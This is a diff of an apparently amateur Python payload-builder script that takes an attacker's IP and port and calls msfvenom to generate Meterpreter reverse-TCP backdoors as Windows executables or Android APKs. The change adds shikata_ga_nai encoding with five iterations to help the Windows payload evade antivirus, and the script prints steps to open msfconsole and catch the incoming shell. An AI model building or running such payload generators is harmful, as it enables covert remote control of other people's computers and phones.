@@ -25,9 +25,9 @@ ip = input("Your ip addres : ")
 port = input("Your port : ")
 name = input("Payload name ? ")
 if payload == "windows":
-    os.system("msfvenom -p "+payload+"/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" -f exe > "+name+".exe")
+    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -e x86/shikata_ga_nai -i 5 -f exe > "+name+".exe" )
 elif payload == "android":
-      os.system("msfvenom -p "+payload+"/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
+      os.system("msfvenom -p android/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
 print("------------------------------------------------------------")
 print("copy and pest this text in terminal to lesson in payload")
 print("msfconsole")
